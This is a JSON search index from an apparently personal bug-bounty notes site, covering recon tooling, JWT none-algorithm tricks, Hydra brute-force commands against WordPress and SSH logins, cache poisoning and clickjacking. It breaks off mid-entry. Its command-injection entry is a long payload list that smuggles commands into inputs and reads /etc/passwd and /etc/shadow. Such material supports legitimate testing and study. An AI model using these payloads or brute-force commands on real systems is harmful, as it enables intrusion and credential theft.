[{"id":0,"href":"/bb/impacts/","title":"Impacts","parent":"Bbs","content":" Impacts SQLi Attacker can obtain full database access holding private user information and other sensitive data. An attacker can use information gathered in SQLi to login in admin panels and obtain access to private and sensitive information.\nXSS Successful exploitation of a XSS allows an attacker to execute arbitrary JavaScript code in the victim’s browser, allowing the attacker to steal cookies, tokens, or any other sensitive information. It is also possible to inject code into the page, allowing the possibility of phishing attacks, redirects, and code manipulation.\nLFI An attacker can read local files on the web server that should not be accessed, such as the application source code or configuration files containing sensitive information.\nAmazon Cognito Identity Unauthorized access to AWS services with temporary user. An attacker can genereate a temporary guest token to peek - and maybe exploit - the company infrastructure.\nATO - password reset An attacker can log into any account by just knowing it\u0026rsquo;s email address.\nOpen redirect An attacker can send the link to users to get them redirected to a malicious domain. To achieve success an attacker must trick vicitims into visiting the crafted URL.\nSensitive README.md exposed Information that is not supposed to be public became public due to misconfigurations. Attacker can use information leaked to learn more about company internals.\n","description":"Impacts SQLi Attacker can obtain full database access holding private user information and other sensitive data. An attacker can use information gathered in SQLi to login in admin panels and obtain access to private and sensitive information.\nXSS Successful exploitation of a XSS allows an attacker to execute arbitrary JavaScript code in the victim’s browser, allowing the attacker to steal cookies, tokens, or any other sensitive information. It is also possible to inject code into the page, allowing the possibility of phishing attacks, redirects, and code manipulation."},{"id":1,"href":"/exploitation/auth/jwt/","title":"JWT","parent":"Exploitations","content":" Change algorithm to None Sometimes APIs don\u0026rsquo;t check for JWT encryption. None algorithm allows an attacker to craft a malicious JWT token to escalate privileges.\nB64 None: eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0\nJWT Injection Sometimes applications reflect data that is stored inside the token, try to create accounts with malicious payloads\nCrack JWTs https://github.com/mazen160/jwt-pwn\n","description":"Change algorithm to None Sometimes APIs don\u0026rsquo;t check for JWT encryption. None algorithm allows an attacker to craft a malicious JWT token to escalate privileges.\nB64 None: eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0\nJWT Injection Sometimes applications reflect data that is stored inside the token, try to create accounts with malicious payloads\nCrack JWTs https://github.com/mazen160/jwt-pwn"},{"id":2,"href":"/exploitation/cms/drupal/","title":"Drupal","parent":"Exploitations","content":" Drupal Drupal hacking guide Once inside, get RCE Reverse Shel with admin access\nContent Discovery Fuzz in example.com/node/FUZZ to find unmapped pages\n","description":"Drupal Drupal hacking guide Once inside, get RCE Reverse Shel with admin access\nContent Discovery Fuzz in example.com/node/FUZZ to find unmapped pages"},{"id":3,"href":"/exploitation/cms/others/","title":"Others","parent":"Exploitations","content":" Joomla joomscan Magento magescan More Look for CVEs under the CMS\nhttps://sploitus.com/\n","description":"Joomla joomscan Magento magescan More Look for CVEs under the CMS\nhttps://sploitus.com/"},{"id":4,"href":"/exploitation/cms/wordpress/","title":"Wordpress","parent":"Exploitations","content":" Wordpress Analyze WP plugins source code wpscan Check WP IP behind WAF Pro tip To maximize results, configure a key in wpscan. ","description":" Wordpress Analyze WP plugins source code wpscan Check WP IP behind WAF Pro tip To maximize results, configure a key in wpscan. "},{"id":5,"href":"/exploitation/workflows/payment/","title":"Payment","parent":"Exploitations","content":" Payment Workflow https://soroush.me/downloadable/common-security-issues-in-financially-orientated-web-applications-_v1.1.pdf\n","description":"Payment Workflow https://soroush.me/downloadable/common-security-issues-in-financially-orientated-web-applications-_v1.1.pdf"},{"id":6,"href":"/recon/spider/","title":"Spider","parent":"Recons","content":" Crawling katana # go install github.com/projectdiscovery/katana/cmd/katana@latest cat hosts | katana -jc -kf all -nc -ef png,jpg,jpeg,css,gif,ttf,woff,woff2,svg,eot Check if hosts/paths are valid # https://github.com/projectdiscovery/httpx cat links.txt | httpx -follow-host-redirects -random-agent -status-code -silent -retries 2 -title -web-server -tech-detect -location -o webs_info.txt Find records # https://github.com/projectdiscovery/dnsx dnsx -retry 3 -a -aaaa -cname -ns -ptr -mx -soa -resp -silent -l subdomains.txt \u0026gt; dnsx_info.txt ","description":" Crawling katana # go install github.com/projectdiscovery/katana/cmd/katana@latest cat hosts | katana -jc -kf all -nc -ef png,jpg,jpeg,css,gif,ttf,woff,woff2,svg,eot Check if hosts/paths are valid # https://github.com/projectdiscovery/httpx cat links.txt | httpx -follow-host-redirects -random-agent -status-code -silent -retries 2 -title -web-server -tech-detect -location -o webs_info.txt Find records # https://github.com/projectdiscovery/dnsx dnsx -retry 3 -a -aaaa -cname -ns -ptr -mx -soa -resp -silent -l subdomains.txt \u0026gt; dnsx_info.txt "},{"id":7,"href":"/recon/subdomain/active/","title":"Active","parent":"Recons","content":" Active Resources The ideia behind an active subdomain recon is to bruteforce subdomain in order to find anything that is valid.\nGet resolvers at:\n# https://github.com/proabiral/Fresh-Resolvers wget https://github.com/proabiral/Fresh-Resolvers/blob/master/resolvers.txt Pure DNS # https://github.com/d3mondev/puredns puredns resolve subdomains.txt -r resolvers.txt --write resolved_dns_domains puredns bruteforce subdomains.txt example.com -r resolvers.txt --write resolved_dns_domains Permutations # https://github.com/Josue87/gotator gotator -sub subdomains/subdomains.txt -perm permutations_list.txt -depth 1 -numbers 10 -mindup -adv -md ","description":" Active Resources The ideia behind an active subdomain recon is to bruteforce subdomain in order to find anything that is valid.\nGet resolvers at:\n# https://github.com/proabiral/Fresh-Resolvers wget https://github.com/proabiral/Fresh-Resolvers/blob/master/resolvers.txt Pure DNS # https://github.com/d3mondev/puredns puredns resolve subdomains.txt -r resolvers.txt --write resolved_dns_domains puredns bruteforce subdomains.txt example.com -r resolvers.txt --write resolved_dns_domains Permutations # https://github.com/Josue87/gotator gotator -sub subdomains/subdomains.txt -perm permutations_list.txt -depth 1 -numbers 10 -mindup -adv -md "},{"id":8,"href":"/recon/subdomain/passive/","title":"Passive","parent":"Recons","content":" Passive Resources A passive resource means that you will grab subdomains that were already discovered by another tools or were found lying around in some place (open source code, legacy scripts, logs, etc).\n# https://github.com/OWASP/Amass amass enum -passive -d domain.com # https://github.com/projectdiscovery/subfinder subfinder -d domain.com -all -silent # https://github.com/tomnomnom/assetfinder assetfinder --subs-only example.com # https://github.com/Findomain/Findomain findomain -u example.com -q # https://github.com/lc/gau # https://github.com/tomnomnom/unfurl gau --subs example.com | unfurl -u domains All in one script amass enum -passive -d domain.com -o amass_$1.txt \u0026gt; /dev/null 2\u0026gt;\u0026amp;1 echo \u0026#34;[+] Amass done\u0026#34; subfinder -silent -d $1 -all -o subfinder_$1.txt \u0026gt; /dev/null 2\u0026gt;\u0026amp;1 echo \u0026#34;[+] Subfinder done\u0026#34; findomain -t $1 -u findomain_$1.txt \u0026gt; /dev/null 2\u0026gt;\u0026amp;1 echo \u0026#34;[+] Findomain done\u0026#34; assetfinder -subs-only $1 \u0026gt; assetfinder_$1.txt echo \u0026#34;[+] Assetfinder done\u0026#34; cat subfinder_$1.txt findomain_$1.txt assetfinder_$1.txt amass_$1.txt | uniq $1_subdomains rm subfinder_$1.txt findomain_$1.txt assetfinder_$1.txt amass_$1.txt Google analytics ID Extract Google tag manager from webiste, format: UAXXXXXX\nhttps://builtwith.com/relationships/tag/UAXXXXXX https://api.hackertarget.com/analyticslookup/?q=UAXXXXXX https://spyonweb.com/UAXXXXXX # https://github.com/Josue87/AnalyticsRelationships cat subdomains.txt | analyticsrelationships Google Tag Manager https://googletagmanager.com/gtm.js?id=TAGID Favicon Search for favicon md5 value in known search engines to find websites related to your search\nTip: Use http.favicon.hash:\u0026lt;hash\u0026gt; on Shodan ","description":"Passive Resources A passive resource means that you will grab subdomains that were already discovered by another tools or were found lying around in some place (open source code, legacy scripts, logs, etc).\n# https://github.com/OWASP/Amass amass enum -passive -d domain.com # https://github.com/projectdiscovery/subfinder subfinder -d domain.com -all -silent # https://github.com/tomnomnom/assetfinder assetfinder --subs-only example.com # https://github.com/Findomain/Findomain findomain -u example.com -q # https://github.com/lc/gau # https://github.com/tomnomnom/unfurl gau --subs example.com | unfurl -u domains All in one script amass enum -passive -d domain."},{"id":9,"href":"/recon/wordlistgeneration/","title":"Wordlistgeneration","parent":"Recons","content":" Wordlist generation After spidering across the target it is a good idea to check the content discovered and append the newly discovered content to your wordlist.\nParameters # https://github.com/tomnomnom/anew cat links.txt | unfurl -u keys | anew all_parameters.txt Paths cat links.txt | unfurl paths | rev | cut -d \u0026#39;/\u0026#39; -f1 | rev | anew paths.txt ","description":" Wordlist generation After spidering across the target it is a good idea to check the content discovered and append the newly discovered content to your wordlist.\nParameters # https://github.com/tomnomnom/anew cat links.txt | unfurl -u keys | anew all_parameters.txt Paths cat links.txt | unfurl paths | rev | cut -d \u0026#39;/\u0026#39; -f1 | rev | anew paths.txt "},{"id":10,"href":"/resources/writeups/","title":"Writeups","parent":"Resources","content":" Write Ups WriteUp Description https://pentester.land/list-of-bug-bounty-writeups.html List of up to date writeups https://labs.detectify.com/2021/09/30/10-types-web-vulnerabilities-often-missed/ Common vulns often missed http://www.pc-help.org/obscure.htm Obscure URLs, useful for SSRF https://ctftime.org/writeups?tags=web200\u0026hidden-tags=web%2cweb100%2cweb200 CTF writeups https://sensepost.com/blog/2021/android-application-testing-using-windows-11-and-windows-subsystem-for-android/ Android testing in windows 11 https://gowthams.gitbook.io/bughunter-handbook/intresting-vulnerabilities/payment-bypasses Payment Flow Vulnerabilites ","description":" Write Ups WriteUp Description https://pentester.land/list-of-bug-bounty-writeups.html List of up to date writeups https://labs.detectify.com/2021/09/30/10-types-web-vulnerabilities-often-missed/ Common vulns often missed http://www.pc-help.org/obscure.htm Obscure URLs, useful for SSRF https://ctftime.org/writeups?tags=web200\u0026hidden-tags=web%2cweb100%2cweb200 CTF writeups https://sensepost.com/blog/2021/android-application-testing-using-windows-11-and-windows-subsystem-for-android/ Android testing in windows 11 https://gowthams.gitbook.io/bughunter-handbook/intresting-vulnerabilities/payment-bypasses Payment Flow Vulnerabilites "},{"id":11,"href":"/exploitation/auth/2fa/","title":"2FA","parent":"Exploitations","content":" Bypasses Response Manipulation (Intercept Response and change it to 200, falses to trues\u0026hellip;) 2FA Code Reusability 2FA Code Leakage in Response Password Reset Disable 2FA CSRF on 2FA Disabling Lack of Brute-Force Protection Clickjacking on 2FA Disabling Page Enabling 2FA doesn\u0026rsquo;t expire Previously active Sessions Bypass 2FA with null or 000000 Direct access to a page, jump 2FA process 2FA code based on timestamp Open ID acr_values can be manipulated as peeer RFC.\nhttps://youst.in/posts/bypassing-2fa-using-openid-misconfiguration/ ","description":"Bypasses Response Manipulation (Intercept Response and change it to 200, falses to trues\u0026hellip;) 2FA Code Reusability 2FA Code Leakage in Response Password Reset Disable 2FA CSRF on 2FA Disabling Lack of Brute-Force Protection Clickjacking on 2FA Disabling Page Enabling 2FA doesn\u0026rsquo;t expire Previously active Sessions Bypass 2FA with null or 000000 Direct access to a page, jump 2FA process 2FA code based on timestamp Open ID acr_values can be manipulated as peeer RFC."},{"id":12,"href":"/exploitation/bypass/403/","title":"403 Bypass","parent":"Exploitations","content":"# https://github.com/laluka/bypass-url-parser python3 bypass-url-parser.py --url target.com # https://github.com/devploit/dontgo403 dontgo403 -u https://example.com ","description":"# https://github.com/laluka/bypass-url-parser python3 bypass-url-parser.py --url target.com # https://github.com/devploit/dontgo403 dontgo403 -u https://example.com "},{"id":13,"href":"/exploitation/cloud/aws/","title":"Amazon AWS","parent":"Exploitations","content":" Cognito AWS Cognito helps to authenticate users using amazon solutions, if identity pool is enabled it is possible to gather a temporary token\nhttps://blog.appsecco.com/exploiting-weak-configurations-in-amazon-cognito-in-aws-471ce761963\nFound secrets? Use those secrets in aws CLI\nOnce inside, escalate your privileges https://dhiyaneshgeek.github.io/cloud/security/2022/06/23/aws-misconfigurations/\nBucket Decloaker https://gist.github.com/fransr/a155e5bd7ab11c93923ec8ce788e3368\n","description":"Cognito AWS Cognito helps to authenticate users using amazon solutions, if identity pool is enabled it is possible to gather a temporary token\nhttps://blog.appsecco.com/exploiting-weak-configurations-in-amazon-cognito-in-aws-471ce761963\nFound secrets? Use those secrets in aws CLI\nOnce inside, escalate your privileges https://dhiyaneshgeek.github.io/cloud/security/2022/06/23/aws-misconfigurations/\nBucket Decloaker https://gist.github.com/fransr/a155e5bd7ab11c93923ec8ce788e3368"},{"id":14,"href":"/recon/asncidr/","title":"ASN/CIDR","parent":"Recons","content":" ASN An autonomous system number (ASN) is a unique identifier that allows its autonomous system to exchange routing information with other systems.\nThe five regional Internet registries are:\nAfrican Network Information Center (AFRINIC) American Registry for Internet Numbers (ARIN) Asia-Pacific Network Information Centre (APNIC) Latin American and Caribbean Network Information Centre (LACNIC) Réseaux IP Européens Network Coordination Centre (RIPE NCC) Obtaining an ASN (autonomous system number) By Organization Name https://asrank.caida.org/asns/by-name/ http://asnlookup.com ASN Lookup tools https://www.bigdatacloud.com/asn-lookup/{ASN} https://bgp.he.net/{ASN} https://ipinfo.io/{ASN} https://bgpview.io/asn/{ASN} https://whois.ipip.net/{ASN} CIDR analysis https://whois.ipip.net/cidr/ https://rdnsdb.com/ https://www.robtex.com/ https://bgp.tools/ https://rapiddns.io/ CIDR range to IP list # https://github.com/robertdavidgraham/masscan masscan -iL list-of-cidrs -oG output --rate 10000 -p 80,8443,443,8080 Reverse CIDRs, IPs to domains # https://github.com/projectdiscovery/tlsx cat list | tlsx -san -cn -silent -resp-only IP information https://ipinfo.io https://www.dnsgrep.cn https://rdnsdb.com/ https://db-ip.com/ ","description":"ASN An autonomous system number (ASN) is a unique identifier that allows its autonomous system to exchange routing information with other systems.\nThe five regional Internet registries are:\nAfrican Network Information Center (AFRINIC) American Registry for Internet Numbers (ARIN) Asia-Pacific Network Information Centre (APNIC) Latin American and Caribbean Network Information Centre (LACNIC) Réseaux IP Européens Network Coordination Centre (RIPE NCC) Obtaining an ASN (autonomous system number) By Organization Name https://asrank."},{"id":15,"href":"/exploitation/cloud/azure/","title":"Azure","parent":"Exploitations","content":" Azure Edge takeover https://onetrick.io/2019/09/28/subdomain-takeover-for-azure-cdn/\nActive Directory recon az ad sp show --id \u0026lt;client_id\u0026gt;\nSometimes ADs are configured as multi-tenants, allowing anyone to login into private tenants.\n","description":"Azure Edge takeover https://onetrick.io/2019/09/28/subdomain-takeover-for-azure-cdn/\nActive Directory recon az ad sp show --id \u0026lt;client_id\u0026gt;\nSometimes ADs are configured as multi-tenants, allowing anyone to login into private tenants."},{"id":16,"href":"/bb/","title":"Bbs","parent":"Welcome to caon.io","content":"","description":""},{"id":17,"href":"/exploitation/vulnerability/other/bruteforce/","title":"Brute Force","parent":"Exploitations","content":" Hash identify # https://github.com/noraj/haiti haiti hash Test for default credentials # https://github.com/ztgrace/changeme ./changeme.py example.com # https://github.com/x90skysn3k/brutespray See documentation Hydra Hydra is a command-line tool for online password attacks, such as website login pages and ssh.\nGeneral format for website attacks: hydra -L \u0026lt;username list\u0026gt; -p \u0026lt;password list\u0026gt; [host] http-post-form \u0026#34;\u0026lt;path\u0026gt;:\u0026lt;form parameters\u0026gt;:\u0026lt;failed login message\u0026gt;\u0026#34; Wordpress Attack WordPress login page with a known username, success parameter S= instead of failure parameter, verbose output:\nhydra -l [username] -P /usr/share/wordlists/rockyou.txt [host] http-post-form \u0026#34;/wp-admin/wp-login.php:log=^USER^\u0026amp;pwd=^PASS^\u0026amp;wp-submit=Log+In:S=http%3A%2F%2F[host]%2Fwp-admin%2F\u0026#34; -V SSH # default hydra -l root -P /usr/share/wordlists/fasttrack.txt [host] ssh # no standard port hydra -s 22022 -l root -P /usr/share/wordlists/fasttrack.txt [host] ssh # with a username wordlist and ports hydra -s 22022 -L userlist.txt -P /usr/share/wordlists/fasttrack.txt [host] ssh -t 4 -v URl Description https://nordpass.com/most-common-passwords-list/ Most used password by nord vpn https://github.com/ihebski/DefaultCreds-cheat-sheet Default credentials for dozen of applications https://cirt.net/passwords Default credentials for dozen of applications https://forum.ywhack.com/bountytips.php?password Default credentials for dozen of applications https://github.com/noraj/pass-station/ Tool to search for creds ## ## https://github.com/ignis-sec/Pwdb-Public Mass list of passwords, based on data https://bit.ly/3nFUfJG Rockyou list 🤘 https://github.com/1N3/IntruderPayloads Lists used by burp https://github.com/WillieStevenson/top-100-passwords/blob/master/password-list.txt Top 100 passwords ","description":"Hash identify # https://github.com/noraj/haiti haiti hash Test for default credentials # https://github.com/ztgrace/changeme ./changeme.py example.com # https://github.com/x90skysn3k/brutespray See documentation Hydra Hydra is a command-line tool for online password attacks, such as website login pages and ssh.\nGeneral format for website attacks: hydra -L \u0026lt;username list\u0026gt; -p \u0026lt;password list\u0026gt; [host] http-post-form \u0026#34;\u0026lt;path\u0026gt;:\u0026lt;form parameters\u0026gt;:\u0026lt;failed login message\u0026gt;\u0026#34; Wordpress Attack WordPress login page with a known username, success parameter S= instead of failure parameter, verbose output:"},{"id":18,"href":"/resources/burpsuite/","title":"Burp Suite","parent":"Resources","content":" Plugins Backslash powered scanner, find additional vulns JS Miner, gets sensitive content from js files Active Scan++, find additional vulns JS Link Finder, find links inside javascript files Param Miner, mines urls searching for parameters Reflector, find reflected inputs Tips n Tricks Send traffic from VPS to local burp # Run this in terminal connecting to vps (if ssh with key is possible) # When in WSL, portforwarding needs to be set ssh -R 8080:127.0.0.1:8080 root@VPS_IP -f -N # If you are in windows and need to pass passsord, use this putty.exe -ssh user@host -pw password -R 8080:127.0.0.1:8080 # Visit the sites in VPS curl URL -x http://127.0.0.1:8080 Repositories IntruderPayloads, collection of payloads used in burp AwesomeBurpExtensions Articles Payload Processing Rule in Burp suite (Part 1) Payload Processing Rule in Burp suite (Part 2) Beginners Guide to Burpsuite Payloads (Part 1) Beginners Guide to Burpsuite Payloads (Part 2) How to burp good Using burp session handling rules ","description":"Plugins Backslash powered scanner, find additional vulns JS Miner, gets sensitive content from js files Active Scan++, find additional vulns JS Link Finder, find links inside javascript files Param Miner, mines urls searching for parameters Reflector, find reflected inputs Tips n Tricks Send traffic from VPS to local burp # Run this in terminal connecting to vps (if ssh with key is possible) # When in WSL, portforwarding needs to be set ssh -R 8080:127."},{"id":19,"href":"/exploitation/vulnerability/cachepoisoning/","title":"Cache Poisoning","parent":"Exploitations","content":"Check if the server is caching requests. You can tell by looking the headers and looking for the words HIT OR DYNAMIC.\nCloudflare caches content based on MIME type only. Akamai acceppts headers\nTrigger Cache /profile.css /profile/nonexistent.css /profile?nonexistent /profile/x.jpeg?nonexistent /profile/.js /profile/;.js Add \\: header Stored XSS Find an endpoint that reflects content to page (cookies, parameter, headers..) and store it by poisoning the cache\nList of cachable extensions 7z csv gif midi png tif zip avi doc gz mkv ppt tiff zst avif docx ico mp3 pptx ttf apk dmg iso mp4 ps webm bin ejs jar ogg rar webp bmp eot jpg otf svg woff bz2 eps jpeg pdf svgz woff2 class exe js pict swf xls css flac mid pls tar xlsx ","description":"Check if the server is caching requests. You can tell by looking the headers and looking for the words HIT OR DYNAMIC.\nCloudflare caches content based on MIME type only. Akamai acceppts headers\nTrigger Cache /profile.css /profile/nonexistent.css /profile?nonexistent /profile/x.jpeg?nonexistent /profile/.js /profile/;.js Add \\: header Stored XSS Find an endpoint that reflects content to page (cookies, parameter, headers..) and store it by poisoning the cache\nList of cachable extensions 7z csv gif midi png tif zip avi doc gz mkv ppt tiff zst avif docx ico mp3 pptx ttf apk dmg iso mp4 ps webm bin ejs jar ogg rar webp bmp eot jpg otf svg woff bz2 eps jpeg pdf svgz woff2 class exe js pict swf xls css flac mid pls tar xlsx "},{"id":20,"href":"/resources/career/","title":"Career Related Topics","parent":"Resources","content":" Site Description https://github.com/rezaduty/cybersecurity-career-path/blob/master/Security_Engineer(Software).md CyberSec career path https://devskiller.com/screen-security-engineer/ Security Engineer Career https://hbr.org/1999/11/management-time-whos-got-the-monkey About management time https://shellsharks.com/getting-into-information-security Steps to start in infosec https://roadmap.sh/cyber-security CyberSec toadmap Boost your CV Site Description https://cve-north-stars.github.io/ Get some CVE\u0026rsquo;s ","description":" Site Description https://github.com/rezaduty/cybersecurity-career-path/blob/master/Security_Engineer(Software).md CyberSec career path https://devskiller.com/screen-security-engineer/ Security Engineer Career https://hbr.org/1999/11/management-time-whos-got-the-monkey About management time https://shellsharks.com/getting-into-information-security Steps to start in infosec https://roadmap.sh/cyber-security CyberSec toadmap Boost your CV Site Description https://cve-north-stars.github.io/ Get some CVE\u0026rsquo;s "},{"id":21,"href":"/exploitation/vulnerability/clickjacking/","title":"Clickjacking","parent":"Exploitations","content":"Clickjacking is an interface-based attack in which a user is tricked into clicking on actionable content on a hidden website by clicking on some other content in a decoy website.\nA website is vulnerable if:\nX-Frame-Options is not set Check header presence with:\nhttps://securityheaders.com/ POC \u0026lt;iframe src=\u0026#34;https://example.com\u0026#34;\u0026gt; ","description":"Clickjacking is an interface-based attack in which a user is tricked into clicking on actionable content on a hidden website by clicking on some other content in a decoy website.\nA website is vulnerable if:\nX-Frame-Options is not set Check header presence with:\nhttps://securityheaders.com/ POC \u0026lt;iframe src=\u0026#34;https://example.com\u0026#34;\u0026gt; "},{"id":22,"href":"/exploitation/vulnerability/commandinjection/","title":"Command Injection","parent":"Exploitations","content":"Command Injection is a critical vulnerability that allows attackers to gain complete control over an affected web site and the underlying web server.\n\u0026amp;lt;!--#exec%20cmd=\u0026amp;quot;/bin/cat%20/etc/passwd\u0026amp;quot;--\u0026amp;gt; \u0026amp;lt;!--#exec%20cmd=\u0026amp;quot;/bin/cat%20/etc/shadow\u0026amp;quot;--\u0026amp;gt; \u0026amp;lt;!--#exec%20cmd=\u0026amp;quot;/usr/bin/id;--\u0026amp;gt; /index.html|id| ;id; ;id ;netstat -a; ;system(\u0026#39;cat%20/etc/passwd\u0026#39;) |id |/usr/bin/id |id| |/usr/bin/id| ||/usr/bin/id| |id; ||/usr/bin/id; ;id| ;|/usr/bin/id| \\n/bin/ls -al\\n \\n/usr/bin/id\\n \\nid\\n \\n/usr/bin/id; \\nid; \\n/usr/bin/id| \\nid| ;/usr/bin/id\\n ;id\\n |usr/bin/id\\n |nid\\n `id` `/usr/bin/id` a);id a;id a);id; a;id; a);id| a;id| a)|id a|id a)|id; |/bin/ls -al a);/usr/bin/id a;/usr/bin/id a);/usr/bin/id; a;/usr/bin/id; a);/usr/bin/id| a;/usr/bin/id| a)|/usr/bin/id a|/usr/bin/id a)|/usr/bin/id; ;system(\u0026#39;id\u0026#39;) ;system(\u0026#39;/usr/bin/id\u0026#39;) %0Acat%20/etc/passwd %0A/usr/bin/id %0Aid %0A/usr/bin/id%0A %0Aid%0A | id \u0026amp; id ; id %0a id %0a $;/usr/bin/id cat /etc/hosts $(`cat /etc/passwd`) cat /etc/passwd {{ get_user_file(\u0026#34;/etc/passwd\u0026#34;) }} \u0026lt;!--#exec cmd=\u0026#34;/bin/cat /etc/passwd\u0026#34;--\u0026gt; \u0026lt;!--#exec cmd=\u0026#34;/bin/cat /etc/shadow\u0026#34;--\u0026gt; \u0026lt;!--#exec cmd=\u0026#34;/usr/bin/id;--\u0026gt; system(\u0026#39;cat /etc/passwd\u0026#39;); \u0026lt;?php system(\u0026#34;cat /etc/passwd\u0026#34;);?\u0026gt; eval(\u0026#39;ls\u0026#39;) eval(\u0026#39;pwd\u0026#39;) eval(\u0026#39;pwd\u0026#39;); eval(\u0026#39;sleep 5\u0026#39;) eval(\u0026#39;sleep 5\u0026#39;); eval(\u0026#39;whoami\u0026#39;) eval(\u0026#39;whoami\u0026#39;); exec(\u0026#39;echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\u0026#39;) exec(\u0026#39;ls\u0026#39;) exec(\u0026#39;pwd\u0026#39;) exec(\u0026#39;pwd\u0026#39;); exec(\u0026#39;sleep 5\u0026#39;) exec(\u0026#39;sleep 5\u0026#39;); exec(\u0026#39;whoami\u0026#39;) exec(\u0026#39;whoami\u0026#39;); ;{$_GET[\u0026#34;cmd\u0026#34;]} \u0026amp;\u0026amp;id ifconfig | ifconfig ; ifconfig \u0026amp; ifconfig \u0026amp;\u0026amp; ifconfig which curl which gcc which nc which netcat which perl which python which wget whoami | whoami ; whoami \u0026#39; whoami \u0026#39; || whoami \u0026#39; \u0026amp; whoami \u0026#39; \u0026amp;\u0026amp; whoami \u0026#39;; whoami \u0026#34; whoami \u0026#34; || whoami \u0026#34; | whoami \u0026#34; \u0026amp; whoami \u0026#34; \u0026amp;\u0026amp; whoami \u0026#34;; whoami $(`whoami`) \u0026amp; whoami \u0026amp;\u0026amp; whoami {{ get_user_file(\u0026#34;C:\\boot.ini\u0026#34;) }} {{ get_user_file(\u0026#34;/etc/hosts\u0026#34;) }} {{4+4}} {{4+8}} 1;sleep${IFS}9;#${IFS}\u0026#39;;sleep${IFS}9;#${IFS}\u0026#34;;sleep${IFS}9;#${IFS} /*$(sleep 5)`sleep 5``*/-sleep(5)-\u0026#39;/*$(sleep 5)`sleep 5` #*/-sleep(5)||\u0026#39;\u0026#34;||sleep(5)||\u0026#34;/*`*/ ;ls ||ls; |ls; \u0026amp;\u0026amp;ls; \u0026amp;ls; %0Als `ls` $(ls) Where to Inject Headers can be vulnerable to command injection attacks, they are not always tested. Sending payloads to GET requests can be valuable as well.\nUser-Agent Custom-headers Host ","description":"Command Injection is a critical vulnerability that allows attackers to gain complete control over an affected web site and the underlying web server.\n\u0026amp;lt;!--#exec%20cmd=\u0026amp;quot;/bin/cat%20/etc/passwd\u0026amp;quot;--\u0026amp;gt; \u0026amp;lt;!--#exec%20cmd=\u0026amp;quot;/bin/cat%20/etc/shadow\u0026amp;quot;--\u0026amp;gt; \u0026amp;lt;!--#exec%20cmd=\u0026amp;quot;/usr/bin/id;--\u0026amp;gt; /index.html|id| ;id; ;id ;netstat -a; ;system(\u0026#39;cat%20/etc/passwd\u0026#39;) |id |/usr/bin/id |id| |/usr/bin/id| ||/usr/bin/id| |id; ||/usr/bin/id; ;id| ;|/usr/bin/id| \\n/bin/ls -al\\n \\n/usr/bin/id\\n \\nid\\n \\n/usr/bin/id; \\nid; \\n/usr/bin/id| \\nid| ;/usr/bin/id\\n ;id\\n |usr/bin/id\\n |nid\\n `id` `/usr/bin/id` a);id a;id a);id; a;id; a);id| a;id| a)|id a|id a)|id; |/bin/ls -al a);/usr/bin/id a;/usr/bin/id a);/usr/bin/id; a;/usr/bin/id; a);/usr/bin/id| a;/usr/bin/id| a)|/usr/bin/id a|/usr/bin/id a)|/usr/bin/id; ;system(\u0026#39;id\u0026#39;) ;system(\u0026#39;/usr/bin/id\u0026#39;) %0Acat%20/etc/passwd %0A/usr/bin/id %0Aid %0A/usr/bin/id%0A %0Aid%0A | id \u0026amp; id ; id %0a id %0a $;/usr/bin/id cat /etc/hosts $(`cat /etc/passwd`) cat /etc/passwd {{ get_user_file(\u0026#34;/etc/passwd\u0026#34;) }} \u0026lt;!"},{"id":23,"href":"/exploitation/vulnerability/cookieattacks/","title":"Cookie Basec Attacks","parent":"Exploitations","content":" Cookies Explained https://cookiepedia.co.uk/\nAttacks Check for 